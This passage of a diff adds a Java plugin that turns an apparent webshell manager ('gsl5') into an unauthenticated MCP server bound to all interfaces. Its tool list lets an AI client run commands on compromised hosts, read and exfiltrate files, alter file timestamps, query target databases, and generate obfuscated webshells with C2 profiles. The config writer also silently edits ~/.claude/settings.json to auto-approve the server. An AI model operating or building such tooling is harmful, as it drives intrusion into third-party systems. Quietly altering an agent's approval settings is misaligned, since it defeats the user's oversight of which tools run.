@@ -1,0 +1,1299 @@
+//
+// MCP Service - \u5b8c\u6574\u529f\u80fd\u7248
+//
+package shells.plugins.generic;
+
+import com.sun.net.httpserver.HttpExchange;
+import com.sun.net.httpserver.HttpHandler;
+import com.sun.net.httpserver.HttpServer;
+import core.ApplicationContext;
+import core.Db;
+import core.annotation.PluginAnnotation;
+import core.imp.Payload;
+import core.imp.Plugin;
+import core.shell.ShellEntity;
+import core.ui.component.dialog.GOptionPane;
+import core.ui.component.model.DbInfo;
+import java.awt.BorderLayout;
+import java.awt.event.ActionEvent;
+import java.io.ByteArrayOutputStream;
+import java.io.IOException;
+import java.io.OutputStream;
+import java.net.InetSocketAddress;
+import java.nio.charset.StandardCharsets;
+import java.nio.file.Files;
+import java.nio.file.Paths;
+import java.util.Base64;
+import java.util.LinkedList;
+import java.util.Map;
+import java.util.UUID;
+import java.util.Vector;
+import java.util.concurrent.ConcurrentHashMap;
+import java.util.concurrent.ConcurrentLinkedQueue;
+import java.util.concurrent.Executors;
+import javax.swing.JButton;
+import javax.swing.JLabel;
+import javax.swing.JPanel;
+import javax.swing.JScrollPane;
+import javax.swing.JTextArea;
+import javax.swing.JTextField;
+import javax.swing.SwingUtilities;
+import core.c2profile.C2ProfileContext;
+import core.c2profile.C2ProfileLoader;
+import core.shellprocessor.StartProcessor;
+import org.yaml.snakeyaml.Yaml;
+import util.Log;
+import util.automaticBindClick;
+import util.functions;
+
+@PluginAnnotation(
+    payloadName = "JavaDynamicPayload",
+    Name = "McpService",
+    DisplayName = "MCP \u670d\u52a1"
+)
+public class McpService implements Plugin {
+
+    private static final int DEFAULT_PORT = 9123;
+    private static HttpServer server;
+    private static boolean running = false;
+    private static int port = DEFAULT_PORT;
+    private static final ConcurrentLinkedQueue<HttpExchange> sseClients = new ConcurrentLinkedQueue<>();
+    private static final Yaml yaml = new Yaml();
+    private static final java.util.concurrent.ConcurrentHashMap<String, ShellEntity> shellCache = new java.util.concurrent.ConcurrentHashMap<>();
+
+
+    private JPanel panel;
+    private JTextField portField;
+    private JButton startBtn;
+    private JButton stopBtn;
+    private JTextArea logArea;
+    private JLabel statusLabel;
+    private JButton writeConfigBtn;
+
+    public McpService() {
+        panel = new JPanel(new BorderLayout(6, 6));
+        JPanel topPanel = new JPanel();
+        topPanel.add(new JLabel("\u7aef\u53e3:"));
+        portField = new JTextField(String.valueOf(DEFAULT_PORT), 6);
+        topPanel.add(portField);
+        startBtn = new JButton("\u542f\u52a8\u670d\u52a1");
+        stopBtn = new JButton("\u505c\u6b62\u670d\u52a1");
+        stopBtn.setEnabled(false);
+        topPanel.add(startBtn);
+        topPanel.add(stopBtn);
+        writeConfigBtn = new JButton("\u5199\u5165\u914d\u7f6e");
+        topPanel.add(writeConfigBtn);
+        statusLabel = new JLabel("\u72b6\u6001: \u5df2\u505c\u6b62");
+        topPanel.add(statusLabel);
+        panel.add(topPanel, BorderLayout.NORTH);
+        logArea = new JTextArea();
+        logArea.setEditable(false);
+        panel.add(new JScrollPane(logArea), BorderLayout.CENTER);
+        automaticBindClick.bindJButtonClick(this, this);
+    }
+
+    public void init(ShellEntity shellEntity) {}
+    public JPanel getView() { return panel; }
+    public void writeConfigBtnClick(ActionEvent e) { writeClaudeConfig(); }
+    public void startBtnClick(ActionEvent e) { startMcpServer(); }
+    public void stopBtnClick(ActionEvent e) { stopMcpServer(); }
+
+    private void startMcpServer() {
+        if (running) return;
+        try { port = Integer.parseInt(portField.getText().trim()); } catch (Exception e) { port = DEFAULT_PORT; }
+        try {
+            server = HttpServer.create(new InetSocketAddress("0.0.0.0", port), 0);
+            server.setExecutor(Executors.newFixedThreadPool(4));
+            server.createContext("/sse", new SseHandler());
+            server.createContext("/message", new MessageHandler());
+            server.createContext("/health", (ex) -> sendJson(ex, 200, j("status","ok","running",true,"port",port)));
+            server.createContext("/config", new ConfigHandler());
+                        server.start();
+            running = true;
+            startBtn.setEnabled(false);
+            stopBtn.setEnabled(true);
+            statusLabel.setText("\u72b6\u6001: \u8fd0\u884c\u4e2d (http://127.0.0.1:" + port + ")");
+            log("[MCP] \u670d\u52a1\u5df2\u542f\u52a8 http://127.0.0.1:" + port);
+        } catch (Exception e) {
+            log("[MCP] \u542f\u52a8\u5931\u8d25: " + e.getMessage());
+            GOptionPane.showMessageDialog(panel, "\u542f\u52a8\u5931\u8d25: " + e.getMessage(), "\u9519\u8bef", 2);
+        }
+    }
+
+        private void writeClaudeConfig() {
+        String json = "{\n" + "  \"mcpServers\": {\n" + "    \"gsl5\": {\n" + "      \"type\": \"sse\",\n" + "      \"url\": \"http://127.0.0.1:" + port + "/sse\"\n" + "    }\n" + "  }\n" + "}";
+        StringBuilder msg = new StringBuilder();
+        // 1. Write to ~/.claude/mcp.json
+        String claudePath = System.getProperty("user.home") + "/.claude/mcp.json";
+        try {
+            java.nio.file.Files.createDirectories(java.nio.file.Paths.get(System.getProperty("user.home") + "/.claude"));
+            java.nio.file.Files.write(java.nio.file.Paths.get(claudePath), json.getBytes(java.nio.charset.StandardCharsets.UTF_8));
+            msg.append("mcp.json: ").append(claudePath).append("\n");
+            log("[MCP] Config written: " + claudePath);
+        } catch (Exception ex) { msg.append("Failed: ").append(ex.getMessage()).append("\n"); }
+        // 2. Write local mcp.json
+        try {
+            java.nio.file.Files.write(java.nio.file.Paths.get("mcp.json"), json.getBytes(java.nio.charset.StandardCharsets.UTF_8));
+            msg.append("Local: mcp.json\n");
+            // Also write to project root .mcp.json for Claude Code auto-discovery
+            try { java.nio.file.Files.write(java.nio.file.Paths.get(System.getProperty("user.dir") + "/.mcp.json"), json.getBytes(java.nio.charset.StandardCharsets.UTF_8)); msg.append("Project: .mcp.json\n"); } catch (Exception ex2) {}
+        } catch (Exception ex) {}
+        // 3. Update settings.json to approve gsl5
+        String settingsPath = System.getProperty("user.home") + "/.claude/settings.json";
+        try {
+            java.io.File sf = new java.io.File(settingsPath);
+            String settingsContent = sf.exists() ? new String(java.nio.file.Files.readAllBytes(sf.toPath()), StandardCharsets.UTF_8) : "{}";
+            if (!settingsContent.contains("\"gsl5\"")) {
+                if (settingsContent.contains("\"enabledMcpjsonServers\"")) {
+                    settingsContent = settingsContent.replaceFirst("(\"enabledMcpjsonServers\"\\s*:\\s*\\[)", "$1\"gsl5\", ");
+                } else {
+                    settingsContent = settingsContent.replace("}", ",\n  \"enableAllProjectMcpServers\": true,\n  \"enabledMcpjsonServers\": [\"gsl5\"]\n}");
+                }
+                java.nio.file.Files.write(sf.toPath(), settingsContent.getBytes(StandardCharsets.UTF_8));
+                msg.append("settings.json: approved gsl5\n");
+                log("[MCP] settings.json updated");
+            }
+        } catch (Exception ex) {}
+        GOptionPane.showMessageDialog(panel, msg.toString() + "\n" + json, "MCP Config", 1);
+    }
+
+    private void stopMcpServer() {
+        if (!running || server == null) return;
+        server.stop(0);
+        running = false;
+        startBtn.setEnabled(true);
+        stopBtn.setEnabled(false);
+        statusLabel.setText("\u72b6\u6001: \u5df2\u505c\u6b62");
+        log("[MCP] \u670d\u52a1\u5df2\u505c\u6b62");
+    }
+
+    public static void startHeadless(int p) {
+        if (p <= 0) port = DEFAULT_PORT; else port = p;
+        System.setProperty("java.awt.headless", "true"); // 禁止 AWT 弹窗，防止 GOptionPane 阻塞 MCP
+        try {
+            server = HttpServer.create(new InetSocketAddress("0.0.0.0", port), 0);
+            server.setExecutor(Executors.newFixedThreadPool(4));
+            McpService dummy = new McpService();
+            server.createContext("/sse", dummy.new SseHandler());
+            server.createContext("/message", dummy.new MessageHandler());
+            server.createContext("/health", (ex) -> {
+                try { sendJson(ex, 200, j("status","ok","running",true,"port",port)); } catch (IOException ignored) {}
+            });
+            server.createContext("/config", dummy.new ConfigHandler());
+                        server.start();
+            running = true;
+            Log.log("[MCP] Headless server started on http://127.0.0.1:" + port);
+            System.out.println("[MCP] Headless server started on http://127.0.0.1:" + port);
+            Runtime.getRuntime().addShutdownHook(new Thread(() -> {
+                if (server != null) { server.stop(0); running = false; }
+                System.out.println("[MCP] Server stopped.");
+            }));
+            try {
+                Thread.currentThread().join();
+            } catch (InterruptedException e) {
+                if (server != null) { server.stop(0); running = false; }
+            }
+        } catch (Exception e) {
+            Log.error(e);
+            System.err.println("[MCP] Failed to start: " + e.getMessage());
+            System.exit(1);
+        }
+    }
+
+
+    private static String getDbPath() {
+        String dbPath = "data.db";
+        try {
+            java.lang.reflect.Field f = core.Db.class.getDeclaredField("DB_URL");
+            f.setAccessible(true);
+            dbPath = ((String) f.get(null)).replace("jdbc:sqlite:", "");
+        } catch (Exception ignored) {}
+        return dbPath;
+    }
+
+
+    private void log(String msg) {
+        Log.log(msg);
+        SwingUtilities.invokeLater(() -> logArea.append(msg + "\n"));
+    }
+
+    // ==================== SSE ====================
+    class SseHandler implements HttpHandler {
+        public void handle(HttpExchange ex) throws IOException {
+            ex.getResponseHeaders().set("Content-Type", "text/event-stream");
+            ex.getResponseHeaders().set("Cache-Control", "no-cache");
+            ex.getResponseHeaders().set("Connection", "keep-alive");
+            ex.getResponseHeaders().set("Access-Control-Allow-Origin", "*");
+            ex.sendResponseHeaders(200, 0);
+            sseClients.add(ex);
+            String endpoint = "http://127.0.0.1:" + port + "/message";
+            try {
+                OutputStream os = ex.getResponseBody();
+                os.write(("event: endpoint\ndata: " + endpoint + "\n\n").getBytes(StandardCharsets.UTF_8));
+                os.flush();
+            } catch (Exception ignored) {}
+            while (running) {
+                try { Thread.sleep(15000); ex.getResponseBody().write(": ping\n\n".getBytes(StandardCharsets.UTF_8)); ex.getResponseBody().flush(); }
+                catch (Exception e) { sseClients.remove(ex); break; }
+            }
+        }
+    }
+
+    // ==================== Message Handler ====================
+    class MessageHandler implements HttpHandler {
+        public void handle(HttpExchange ex) throws IOException {
+            if ("OPTIONS".equalsIgnoreCase(ex.getRequestMethod())) {
+                ex.getResponseHeaders().set("Access-Control-Allow-Origin", "*");
+                ex.getResponseHeaders().set("Access-Control-Allow-Methods", "POST, GET, OPTIONS");
+                ex.getResponseHeaders().set("Access-Control-Allow-Headers", "Content-Type");
+                ex.sendResponseHeaders(204, -1); return;
+            }
+            byte[] bodyBytes = functions.readInputStream(ex.getRequestBody());
+            String body = new String(bodyBytes, StandardCharsets.UTF_8);
+            ex.getResponseHeaders().set("Content-Type", "application/json");
+            ex.getResponseHeaders().set("Access-Control-Allow-Origin", "*");
+            try {
+                Map<String, Object> req = yaml.load(body);
+                String method = (String) req.get("method");
+                Object id = req.get("id");
+                Object params = req.get("params");
+                String result = dispatch(method, params, id);
+                // Push through SSE and also return as HTTP response
+                for (HttpExchange sse : sseClients) {
+                    try { sse.getResponseBody().write(("event: message\ndata: " + result + "\n\n").getBytes(StandardCharsets.UTF_8)); sse.getResponseBody().flush(); }
+                    catch (Exception ign) { sseClients.remove(sse); }
+                }
+                sendJson(ex, 202, result);
+            } catch (Exception e) {
+                sendJson(ex, 200, j("jsonrpc","2.0","id",null,"error",m("code",-32603,"message",e.getMessage())));
+            }
+        }
+    }
+
+    
+
+
+@SuppressWarnings("unchecked")
+    private String dispatch(String method, Object params, Object id) {
+        try {
+            switch (method) {
+                case "initialize":
+                    return j("jsonrpc","2.0","id",id,"result",
+                        m("capabilities", m("tools", m()),
+                          "serverInfo", m("name","gsl5-mcp","version","2.0.0"),
+                          "protocolVersion","2024-11-05"));
+                case "tools/list": return toolsList(id);
+                case "tools/call": return toolsCall(params, id);
+                case "notifications/initialized": return j("jsonrpc","2.0","id",id,"result",m());
+                default: return j("jsonrpc","2.0","id",id,"error",m("code",-32601,"message","Unknown: "+method));
+            }
+        } catch (Exception e) {
+            return j("jsonrpc","2.0","id",id,"error",m("code",-32000,"message",e.getMessage()!=null?e.getMessage():"error"));
+        }
+    }
+
+    // ==================== TOOLS LIST ====================
+    private String toolsList(Object id) {
+        StringBuilder sb = new StringBuilder();
+        sb.append("{\"jsonrpc\":\"2.0\",\"id\":").append(toJson(id)).append(",\"result\":{\"tools\":[");
+        // Shell CRUD (5)
+        sb.append(t("shell_list","\u5217\u51fa\u6240\u6709 Shell \u914d\u7f6e", p("group",s("\u5206\u7ec4\uff0c\u9ed8\u8ba4 /"))));
+        sb.append(",").append(t("shell_get","\u83b7\u53d6\u5355\u4e2a Shell \u5b8c\u6574\u914d\u7f6e", p("shellId",s("\u5fc5\u586b"))));
+        sb.append(",").append(t("shell_add","\u6dfb\u52a0\u65b0 WebShell(\u4ec5\u4fdd\u5b58\u914d\u7f6e,\u4e0d\u751f\u6210\u6587\u4ef6,\u4e0d\u8fde\u63a5)", p("url",s("\u5fc5\u586b"),"password",s("\u5fc5\u586b"),"secretKey",s("\u5fc5\u586b"),"payload",s("\u5fc5\u586b"),"cryption",s("\u5fc5\u586b"),"encoding",s("\u9ed8\u8ba4UTF-8"),"remark",s(""),"headers",s(""),"proxyType",s(""),"proxyHost",s(""),"proxyPort",s(""),"connTimeout",i(),"readTimeout",i())));
+        sb.append(",").append(t("shell_edit","\u7f16\u8f91 Shell \u914d\u7f6e", p("shellId",s("\u5fc5\u586b"),"url",s(""),"password",s(""),"secretKey",s(""),"payload",s(""),"cryption",s(""),"remark",s(""),"headers",s(""),"proxyType",s(""),"proxyHost",s(""),"connTimeout",i(),"readTimeout",i(),"c2Profile",s(""))));
+        sb.append(",").append(t("shell_delete","\u5220\u9664 Shell", p("shellId",s("\u5fc5\u586b"))));
+        // System (2)
+        sb.append(",").append(t("shell_info","\u83b7\u53d6\u8fdc\u7a0b\u7cfb\u7edf\u4fe1\u606f", p("shellId",s("\u5fc5\u586b"))));
+        sb.append(",").append(t("shell_test","\u6d4b\u8bd5 Shell \u8fde\u63a5", p("shellId",s("\u5fc5\u586b"))));
+        // Command (1)
+        sb.append(",").append(t("shell_exec","\u6267\u884c\u7cfb\u7edf\u547d\u4ee4", p("shellId",s("\u5fc5\u586b"),"command",s("\u5fc5\u586b"))));
+        // File ops (12)
+        sb.append(",").append(t("file_list","\u5217\u51fa\u76ee\u5f55(\u539f\u751fAPI,\u7ed3\u6784\u5316\u8f93\u51fa)", p("shellId",s("\u5fc5\u586b"),"path",s("\u9ed8\u8ba4\u5f53\u524d\u76ee\u5f55"))));
+        sb.append(",").append(t("file_read","\u8bfb\u53d6\u6587\u4ef6\u5185\u5bb9(\u9002\u5408\u5c0f\u6587\u4ef6/\u914d\u7f6e\u6587\u4ef6,>512KB\u81ea\u52a8\u63d0\u793a\u7528file_download_local)", p("shellId",s("\u5fc5\u586b"),"path",s("\u5fc5\u586b"))));
+        sb.append(",").append(t("file_upload_local","\u672c\u5730\u6587\u4ef6\u76f4\u4f20\u8fdc\u7a0b(\u670d\u52a1\u7aef\u8bfb\u6587\u4ef6,\u81ea\u52a8\u5206\u7247,\u4e0d\u7ecfAI)", p("shellId",s("\u5fc5\u586b"),"localPath",s("\u5fc5\u586b,\u672c\u5730\u8def\u5f84"),"remotePath",s("\u5fc5\u586b,\u8fdc\u7a0b\u8def\u5f84"))));
+        sb.append(",").append(t("file_download_local","\u8fdc\u7a0b\u6587\u4ef6\u76f4\u63a5\u4fdd\u5b58\u5230\u672c\u5730(\u670d\u52a1\u7aef\u5199\u6587\u4ef6,\u4e0d\u7ecfAI)", p("shellId",s("\u5fc5\u586b"),"remotePath",s("\u5fc5\u586b,\u8fdc\u7a0b\u8def\u5f84"),"localPath",s("\u5fc5\u586b,\u672c\u5730\u4fdd\u5b58\u8def\u5f84"))));
+        sb.append(",").append(t("file_delete","\u5220\u9664\u6587\u4ef6", p("shellId",s("\u5fc5\u586b"),"path",s("\u5fc5\u586b"))));
+        sb.append(",").append(t("file_copy","\u590d\u5236\u6587\u4ef6", p("shellId",s("\u5fc5\u586b"),"src",s("\u5fc5\u586b"),"dest",s("\u5fc5\u586b"))));
+        sb.append(",").append(t("file_move","\u79fb\u52a8/\u91cd\u547d\u540d\u6587\u4ef6", p("shellId",s("\u5fc5\u586b"),"src",s("\u5fc5\u586b"),"dest",s("\u5fc5\u586b"))));
+        sb.append(",").append(t("file_mkdir","\u521b\u5efa\u76ee\u5f55", p("shellId",s("\u5fc5\u586b"),"path",s("\u5fc5\u586b"))));
+        sb.append(",").append(t("file_attr","\u8bbe\u7f6e\u6587\u4ef6\u5c5e\u6027/\u65f6\u95f4", p("shellId",s("\u5fc5\u586b"),"path",s("\u5fc5\u586b"),"type",s("fileBasicAttr \u6216 fileTimeAttr"),"attr",s("\u5c5e\u6027\u503c"))));
+        sb.append(",").append(t("file_remote_down","\u8fdc\u7a0b\u4e0b\u8f7d\u5230\u76ee\u6807", p("shellId",s("\u5fc5\u586b"),"url",s("\u5fc5\u586b"),"savePath",s("\u5fc5\u586b"))));
+        sb.append(",").append(t("file_roots","\u5217\u51fa\u6587\u4ef6\u7cfb\u7edf\u6839\u76ee\u5f55", p("shellId",s("\u5fc5\u586b"))));
+        // DB (3)
+        sb.append(",").append(t("db_exec","\u6267\u884c SQL\u3002\u652f\u6301configName\u76f4\u63a5\u7528\u5df2\u4fdd\u5b58\u914d\u7f6e(\u7701\u7565host/user/pass)", p("shellId",s("\u5fc5\u586b"),"configName",s("\u9009\u586b,\u7528db_configs(list)\u67e5,\u586b\u4e86\u53ef\u7701\u7565\u4ee5\u4e0b\u8fde\u63a5\u53c2\u6570"),"dbType",s("mysql/oracle/sqlserver/postgresql/sqlite"),"dbHost",s(""),"dbPort",s(""),"dbName",s(""),"dbUser",s(""),"dbPass",s(""),"sql",s("\u5fc5\u586b"),"execType",s("select\u6216update"))));
+        sb.append(",").append(t("db_list_types","\u5217\u51fa\u652f\u6301\u7684\u6570\u636e\u5e93\u7c7b\u578b", p("shellId",s("\u5fc5\u586b"))));
+        sb.append(",").append(t("db_configs","\u7ba1\u7406\u6570\u636e\u5e93\u914d\u7f6e", p("shellId",s("\u5fc5\u586b"),"action",s("list/add/get/update/delete"),"configName",s(""),"dbInfo",s("YAML\u683c\u5f0f"))));
+        // Payloads (1)
+        sb.append(",").append(t("payload_list","\u5217\u51fa\u6240\u6709 Payload \u53ca\u53ef\u7528\u52a0\u5bc6\u5668(Cryption)\u3002\u975eC2\u52a0\u5bc6\u5668\u76f4\u63a5\u7528\u4e8eshell_create;C2\u52a0\u5bc6\u5668(\u540d\u542bC2)\u8fd8\u9700c2profile_list\u67e5\u6a21\u677f", p()));
+        // C2 Profile (2)
+        sb.append(",").append(t("c2profile_list","\u5217\u51fa\u53ef\u7528\u7684 C2 \u914d\u7f6e\u6a21\u677f(\u7528\u4e8e JAVA_C2 \u7b49C2\u52a0\u5bc6\u5668\u751f\u6210Shell\u65f6\u9009\u6a21\u677f)", p("payload",s("\u53ef\u9009\u8fc7\u6ee4"))));
+        sb.append(",").append(t("c2profile_get","\u83b7\u53d6\u6307\u5b9a C2 \u914d\u7f6e\u6a21\u677f\u7684\u5b8c\u6574\u5185\u5bb9", p("name",s("\u5fc5\u586b,\u4ece c2profile_list \u83b7\u53d6\u6a21\u677f\u540d"))));
+        // Env (1)
+        sb.append(",").append(t("shell_env","\u8bfb\u53d6/\u8bbe\u7f6e Shell \u73af\u5883\u53d8\u91cf", p("shellId",s("\u5fc5\u586b"),"action",s("get/set/del/list"),"key",s(""),"value",s(""))));
+        // Export/Import (2)
+        sb.append(",").append(t("shell_export","\u5bfc\u51fa Shell \u914d\u7f6e\u4e3a\u94fe\u63a5", p("shellId",s("\u53ef\u9009\u5355\u4e2a\u6216\u591a\u4e2a"))));
+        sb.append(",").append(t("shell_import","\u4ece gsl5://import?data=... \u94fe\u63a5\u5bfc\u5165 Shell\uff08\u81ea\u52a8\u56de\u8fde\u6d4b\u8bd5\uff0c\u8fd4\u56de\u8fde\u63a5\u72b6\u6001\u548c\u7cfb\u7edf\u4fe1\u606f\uff09", p("link",s("\u5fc5\u586b,gsl5://..."))));
+        // Settings (2)
+        sb.append(",").append(t("settings_get","\u8bfb\u53d6\u5e94\u7528\u8bbe\u7f6e", p("key",s("\u53ef\u9009"))));
+        sb.append(",").append(t("settings_set","\u4fee\u6539\u5e94\u7528\u8bbe\u7f6e", p("key",s("\u5fc5\u586b"),"value",s("\u5fc5\u586b"))));
+                sb.append(",").append(t("config_read","\u8bfb\u53d6 config.yaml", p()));
+        sb.append(",").append(t("config_write","\u5199\u5165 config.yaml", p("content",s("\u5185\u5bb9"))));
+        sb.append(",").append(t("mcp_config","\u751f\u6210 Claude MCP \u914d\u7f6e", p("outputPath",s("\u53ef\u9009"))));
+        sb.append(",").append(t("mcp_status","MCP \u670d\u52a1\u72b6\u6001", p()));
+        sb.append(",").append(t("oplog_query","\u67e5\u8be2\u56e2\u961f\u64cd\u4f5c\u65e5\u5fd7", p("limit",i(),"action",s("\u53ef\u9009"))));
+        sb.append(",").append(t("shell_backup","\u5907\u4efd Shell \u5217\u8868", p("genFile",s("\u53ef\u9009"))));
+        sb.append(",").append(t("shell_count","Shell \u7edf\u8ba1", p("group",s("\u53ef\u9009"))));
+        sb.append(",").append(t("shell_search","\u641c\u7d22 Shell", p("keyword",s("\u5173\u952e\u8bcd"))));
+        sb.append(",").append(t("shell_clone","\u514b\u9686 Shell", p("shellId",s("\u5fc5\u586b"),"newUrl",s("\u53ef\u9009"))));
+        sb.append(",").append(t("shell_batch_test","\u6279\u91cf\u6d4b\u8bd5\u8fde\u63a5", p("group",s("\u53ef\u9009"))));
+        sb.append(",").append(t("shell_create","\u76f4\u63a5\u751f\u6210WebShell\u6587\u4ef6\u3002\u652f\u6301\u6a21\u7cca\u52a0\u5bc6\u5668\u540d(aesbase64/java_c2/gzip\u7b49\u81ea\u52a8\u8bc6\u522b),C2\u7c7b\u578b\u81ea\u52a8\u9009\u6a21\u677f,\u65e0\u9700payload_list/c2profile_list", p("url",s("\u9009\u586b"),"password",s("\u9009\u586b,\u9ed8\u8ba4pass"),"secretKey",s("\u9009\u586b,\u9ed8\u8ba4key"),"payload",s("\u9009\u586b,\u9ed8\u8ba4JavaDynamicPayload"),"cryption",s("\u5fc5\u586b,\u652f\u6301\u6a21\u7cca\u540d\u5982aesbase64/java_c2/gzip"),"genFile",s("\u5fc5\u586b,\u8f93\u51fa\u8def\u5f84"),"obfuscation",s("\u9009\u586b:none/default/superObfuscation"),"c2Profile",s("\u9009\u586b,C2\u7c7b\u578b\u81ea\u52a8\u9009\u7b2c\u4e00\u4e2a"))));
+        sb.append(",").append(t("process_list","\u8fdb\u7a0b\u5217\u8868", p("shellId",s("\u5fc5\u586b"))));
+        sb.append(",").append(t("file_search","\u641c\u7d22\u6587\u4ef6", p("shellId",s("\u5fc5\u586b"),"pattern",s("\u5fc5\u586b"),"path",s("\u53ef\u9009"))));
+        sb.append(",").append(t("net_info","\u7f51\u7edc\u4fe1\u606f", p("shellId",s("\u5fc5\u586b"))));
+        sb.append("]}}");
+        return sb.toString();
+    }
+
+    // ==================== TOOLS CALL DISPATCH ====================
+    @SuppressWarnings("unchecked")
+    private String toolsCall(Object params, Object id) {
+        Map<String, Object> p = (Map<String, Object>) params;
+        String name = (String) p.get("name");
+        Map<String, Object> a = (Map<String, Object>) p.getOrDefault("arguments", new java.util.HashMap<>());
+        String text;
+        try {
+            switch (name) {
+                case "shell_count":  text = shellCount(a); break;
+                case "shell_search": text = shellSearch(a); break;
+                case "shell_list":   text = shellList(a); break;
+                case "shell_get":    text = shellGet(a); break;
+                case "shell_add":    text = shellAdd(a); break;
+                case "shell_edit":   text = shellEdit(a); break;
+                case "shell_delete": text = shellDelete(a); break;
+                case "shell_clone":  text = shellClone(a); break;
+                case "shell_batch_test": text = shellBatchTest(a); break;
+                case "shell_info":   text = shellInfo(a); break;
+                case "shell_test":   text = shellTest(a); break;
+                case "shell_exec":   text = shellExec(a); break;
+                case "process_list": text = processList(a); break;
+                case "file_search":  text = fileSearch(a); break;
+                case "net_info":     text = netInfo(a); break;
+                case "file_list":    text = fileList(a); break;
+                case "file_read":    text = fileRead(a); break;
+                case "file_upload_local": text = fileUploadLocal(a); break;
+                case "file_download_local": text = fileDownloadLocal(a); break;
+                case "file_delete":  text = fileDelete(a); break;
+                case "file_copy":    text = fileCopy(a); break;
+                case "file_move":    text = fileMove(a); break;
+                case "file_mkdir":   text = fileMkdir(a); break;
+                case "file_attr":    text = fileAttr(a); break;
+                case "file_remote_down": text = fileRemoteDown(a); break;
+                case "file_roots":   text = fileRoots(a); break;
+                case "db_exec":      text = dbExec(a); break;
+                case "db_list_types": text = dbListTypes(a); break;
+                case "db_configs":   text = dbConfigs(a); break;
+                case "payload_list": text = payloadList(); break;
+                case "c2profile_list": text = c2profileList(a); break;
+                case "c2profile_get":  text = c2profileGet(a); break;
+                case "shell_env":    text = shellEnv(a); break;
+                case "shell_export": text = shellExport(a); break;
+                case "shell_import": text = shellImport(a); break;
+                case "shell_create":  text = shellCreate(a); break;
+                case "settings_get": text = settingsGet(a); break;
+                case "settings_set": text = settingsSet(a); break;
+                case "config_read":  text = configRead(a); break;
+                case "config_write": text = configWrite(a); break;
+                case "oplog_query":  text = oplogQuery(a); break;
+                case "shell_backup": text = shellBackup(a); break;
+                case "mcp_status":  text = mcpStatus(a); break;
+                case "mcp_config":  text = mcpConfig(a); break;
+                default: text = "\u672a\u77e5\u5de5\u5177: " + name;
+            }
+        } catch (Exception e) {
+            text = "\u6267\u884c\u5931\u8d25: " + e.getClass().getSimpleName() + ": " + (e.getMessage() != null ? e.getMessage() : "");
+        }
+        return j("jsonrpc","2.0","id",id,"result",m("content",a(m("type","text","text",text))));
+    }
+
+    // ==================== IMPLEMENTATIONS ====================
+
+    private ShellEntity getShell(Map<String, Object> a) {
+        String sid = (String) a.get("shellId");
+        ShellEntity sh = Db.getOneShell(sid);
+        if (sh == null) throw new RuntimeException("\u672a\u627e\u5230 Shell: " + sid);
+        return sh;
+    }
+
+    private ShellEntity getShellInit(Map<String, Object> a) {
+        String sid = (String) a.get("shellId");
+        ShellEntity sh = shellCache.get(sid);
+        if (sh != null && sh.getPayloadModule() != null) return sh;
+        synchronized (shellCache) {
+            sh = shellCache.get(sid);
+            if (sh != null && sh.getPayloadModule() != null) return sh;
+            sh = getShell(a);
+            if (!sh.initShellOpertion()) throw new RuntimeException("Shell \u521d\u59cb\u5316\u5931\u8d25");
+            shellCache.put(sid, sh);
+        }
+        return sh;
+    }
+
+    static void closeShell(String sid) {
+        ShellEntity sh = shellCache.remove(sid);
+        if (sh != null) {
+            try { if (sh.getPayloadModule() != null) sh.getPayloadModule().close(); } catch (Exception ignored) {}
+        }
+    }
+
+    private int toInt(Object v, int def) {
+        if (v == null) return def;
+        if (v instanceof Number) return ((Number) v).intValue();
+        try { return Integer.parseInt(v.toString()); } catch (Exception e) { return def; }
+    }
+    private long toLong(Object v, long def) {
+        if (v == null) return def;
+        if (v instanceof Number) return ((Number) v).longValue();
+        try { return Long.parseLong(v.toString()); } catch (Exception e) { return def; }
+    }
+
+    private String shellSearch(Map<String, Object> a) {
+        String kwRaw = (String) a.get("keyword");
+        if (kwRaw == null || kwRaw.isEmpty()) return "\u8bf7\u63d0\u4f9b\u641c\u7d22\u5173\u952e\u5b57";
+        String kw = kwRaw.toLowerCase();
+        Vector<Vector<String>> rows = Db.getAllShell();
+        if (rows.size() <= 1) return "\u65e0 Shell \u8bb0\u5f55";
+        rows.remove(0);
+        StringBuilder sb = new StringBuilder();
+        int found = 0;
+        for (Vector<String> row : rows) {
+            String line = row.get(0) + " " + (row.size()>1?row.get(1):"") + " " + (row.size()>15?row.get(15):"");
+            if (line.toLowerCase().contains(kw)) {
+                sb.append(row.get(0)).append(" | ").append(row.size()>1?row.get(1):"").append(" | ").append(row.size()>5?row.get(5):"").append(" | ").append(row.size()>15?row.get(15):"").append("\n");
+                found++;
+            }
+        }
+        return found > 0 ? "\u627e\u5230 " + found + " \u4e2a:\n" + sb.toString() : "\u672a\u627e\u5230\u5339\u914d \"" + kw + "\" \u7684 Shell";
+    }
+
+    private String shellCount(Map<String, Object> a) {
+        String group = (String) a.getOrDefault("group", "/");
+        Vector<Vector<String>> rows = "/".equals(group) ? Db.getAllShell() : Db.getAllShell(group);
+        int total = rows.size() > 0 ? rows.size() - 1 : 0;
+        return "Shell \u603b\u6570: " + total + " (\u5206\u7ec4: " + group + ")";
+    }
+
+    // --- Shell CRUD ---
+    private String shellList(Map<String, Object> a) {
+        String group = (String) a.getOrDefault("group", "/");
+        Vector<Vector<String>> rows = "/".equals(group) ? Db.getAllShell() : Db.getAllShell(group);
+        if (rows.size() > 1) rows.remove(0);
+        StringBuilder sb = new StringBuilder();
+        for (Vector<String> row : rows) {
+            String sid = row.get(0); String url = row.size()>1?row.get(1):""; String payload = row.size()>4?row.get(4):"";
+            String cryption = row.size()>5?row.get(5):""; String remark = row.size()>15?row.get(15):"";
+            sb.append(sid).append(" | ").append(url).append(" | ").append(payload).append("+").append(cryption);
+            if (!remark.isEmpty()) sb.append(" | ").append(remark); sb.append("\n");
+        }
+        return sb.length()>0 ? sb.toString() : "\u65e0 Shell \u8bb0\u5f55";
+    }
+
+    private String shellGet(Map<String, Object> a) { return getShell(a).toString(); }
+
+    private String shellAdd(Map<String, Object> a) {
+        ShellEntity sh = new ShellEntity();
+        sh.setId(UUID.randomUUID().toString());
+        sh.setUrl((String) a.get("url"));
+        sh.setPassword((String) a.get("password"));
+        sh.setSecretKey((String) a.get("secretKey"));
+        sh.setPayload((String) a.get("payload"));
+        sh.setCryption((String) a.get("cryption"));
+        sh.setEncoding((String) a.getOrDefault("encoding", "UTF-8"));
+        if (a.containsKey("remark")) sh.setRemark((String) a.get("remark"));
+        if (a.containsKey("headers")) sh.setHeader((String) a.get("headers"));
+        if (a.containsKey("proxyType")) sh.setProxyType((String) a.get("proxyType"));
+        if (a.containsKey("proxyHost")) sh.setProxyHost((String) a.get("proxyHost"));
